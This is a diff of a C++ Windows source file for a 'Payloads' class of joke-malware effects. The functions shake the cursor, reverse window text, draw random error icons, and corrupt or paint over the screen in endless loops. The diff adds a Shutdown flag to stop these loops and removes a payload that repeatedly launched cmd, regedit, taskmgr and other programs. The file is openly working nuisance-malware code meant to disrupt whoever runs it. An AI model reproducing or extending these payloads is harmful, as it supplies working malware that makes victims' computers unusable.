@@ -2,11 +2,14 @@
 #include <Windows.h>
 #include <atomic>
 
+
+
 int ScrW = GetSystemMetrics(0);
 int ScrH = GetSystemMetrics(1);
 HWND hwnd = GetDesktopWindow();
 
 
+std::atomic<bool> Payloads::Shutdown(false);
 std::atomic<bool> Payloads::ScreenShakeStop(false);
 
 
@@ -14,7 +17,7 @@ std::atomic<bool> Payloads::ScreenShakeStop(false);
 void Payloads::MouseShake() {
 	POINT cursor;
 
-	while (true) {	
+	while (!Shutdown) {
 		GetCursorPos(&cursor);
 		SetCursorPos(cursor.x + (rand() % 3 - 1), cursor.y + (rand() % 3 - 1));
 		Sleep(10);
@@ -57,7 +60,7 @@ BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
 }
 
 void Payloads::ReverseText() {
-	while (true) {
+	while (!Shutdown) {
 		EnumChildWindows(hwnd, &EnumChildProc, NULL);
 		Sleep(10);
 	}
@@ -66,7 +69,7 @@ void Payloads::ReverseText() {
 
 void Payloads::RandomErrors() {
 	HDC hdc;
-	while (true) {
+	while (!Shutdown) {
 		int ix = GetSystemMetrics(SM_CXICON) / 2;
 		int iy = GetSystemMetrics(SM_CYICON) / 2;
 		hdc = GetWindowDC(hwnd);
@@ -82,7 +85,7 @@ void Payloads::RandomErrors() {
 
 void Payloads::DisplayBugs() {
 	HDC hdc;
-	while (true) {
+	while (!Shutdown) {
 		hdc = GetWindowDC(hwnd);
 		BitBlt(hdc, rand() % 666, rand() % 666, ScrW, ScrH, hdc, rand() % 666, rand() % 666, NOTSRCERASE);
 		Sleep(500);
@@ -93,7 +96,7 @@ void Payloads::DisplayBugs() {
 
 void Payloads::DisplayArtifacts() {
 	HDC hdc;
-	while (true) {
+	while (!Shutdown) {
 		hdc = GetWindowDC(hwnd);
 		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
 		SelectObject(hdc, brush);
@@ -106,24 +109,3 @@ void Payloads::DisplayArtifacts() {
 		Sleep(rand() % 5000 + 2000);
 	}
 }
-
-const char* files[] = {
-	"calc",
-	"notepad",
-	"cmd",
-	"regedit",
-	"explorer",
-	"taskmgr",
-	"mspaint",
-	"devmgmt.msc",
-	"control",
-};
-
-void Payloads::OpenRandomApps() {
-	int nFiles = sizeof(files) / sizeof(void*);
-	while (true) {
-		ShellExecuteA(NULL, "open", (LPCSTR)files[rand() % nFiles], NULL, NULL, SW_SHOWDEFAULT);
-		Sleep(rand() & 5000 + 1000);
-	}	
-}
-
